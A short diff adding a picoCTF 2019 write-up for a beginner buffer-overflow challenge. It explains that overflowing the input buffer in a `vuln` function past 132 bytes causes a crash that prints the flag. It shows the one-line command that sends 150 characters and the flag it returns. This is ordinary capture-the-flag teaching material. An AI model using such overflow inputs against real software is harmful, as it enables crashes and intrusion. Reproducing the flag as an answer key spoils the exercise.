@@ -1,0 +1,6 @@
+Looking at the program's source code, we can see that the flag gets printed if we're able to create a segmentation fault.
+This can easily be done by overflowing the input buffer within the `vuln` function with a number greater
+than 132 (128 + 4 extra bytes for EBP).
+
+james9909@pico-2019-shell1:/problems/overflow-0_6_1279241c50d050a1045301d7970f2fe3$ ./vuln $(python -c "print 'a'*150")
+picoCTF{3asY_P3a5yd4a28467}
